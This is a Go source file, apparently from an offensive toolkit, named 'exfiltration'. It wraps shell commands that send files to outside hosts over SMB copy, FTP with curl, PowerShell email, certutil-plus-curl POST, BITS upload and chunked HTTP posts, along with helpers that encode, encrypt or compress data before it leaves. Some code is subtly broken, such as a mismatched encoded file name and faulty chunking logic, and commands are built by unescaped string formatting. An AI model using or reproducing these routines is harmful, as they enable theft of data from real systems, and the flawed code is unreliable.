package exfiltration

import (
	"fmt"
	"os/exec"
)

func SMBExfil(share, dataFile string) (string, error) {
	cmd := exec.Command("cmd", "/C", fmt.Sprintf("copy %s %s", dataFile, share))
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func FTPExfil(server, username, password, dataFile string) (string, error) {
	cmd := exec.Command("curl", "-T", dataFile, fmt.Sprintf("ftp://%s:%s@%s/", username, password, server))
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func EmailExfil(smtpServer, from, to, subject, dataFile string) (string, error) {
	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf(`Send-MailMessage -SmtpServer '%s' -From '%s' -To '%s' -Subject '%s' -Attachments '%s'`, smtpServer, from, to, subject, dataFile))
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func ExfilViaCertutil(dataFile, remoteURL string) (string, error) {
	cmd := exec.Command("cmd", "/C", fmt.Sprintf("certutil -encode %s encoded.b64 && curl -X POST -d @encoded.64 %s", dataFile, remoteURL))
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func ExfilViaBITS(dataFile, remoteURL string) (string, error) {
	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf(`Start-BitsTransfer -Source '%s' -Destination '%s' -TransferType Upload`, dataFile, remoteURL))
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func ExfilSplitAndReassemble(dataFile, chunkSize, remoteBaseURL string) (string, error) {
	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf(`$i=0;foreach($chunk in [IO.File]::ReadAllBytes('%s')|foreach{($_..($_+%s-1))}){$fn='chunk{0:D3}.bin'-f$i++;curl -X POST -d @([byte[]]$chunk) '%s/$fn'}`,
			dataFile, chunkSize, remoteBaseURL))
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func ExfilEncodeBase64(inputFile, outputFile string) (string, error) {
	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf(`[Convert]::ToBase64String([IO.File]::ReadAllBytes('%s'))|Out-File -Encoding ASCII '%s'`, inputFile, outputFile))
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func ExfilEncodeHex(inputFile, outputFile string) (string, error) {
	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf(`[BitConverter]::ToString([IO.File]::ReadAllBytes('%s'))-replace'-',''|Out-File -Encoding ASCII '%s'`, inputFile, outputFile))
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func ExfilEncrypt(inputFile, outputFile, password string) (string, error) {
	cmd := exec.Command("openssl", "enc", "-aes-256-cbc", "-salt", "-in", inputFile, "-out", outputFile, "-k", password)
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func ExfilCompress(inputFile, outputFile string) (string, error) {
	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf(`Compress-Archive -Path '%s' -DestinationPath '%s' -Force`, inputFile, outputFile))
	out, err := cmd.CombinedOutput()
	return string(out), err
}
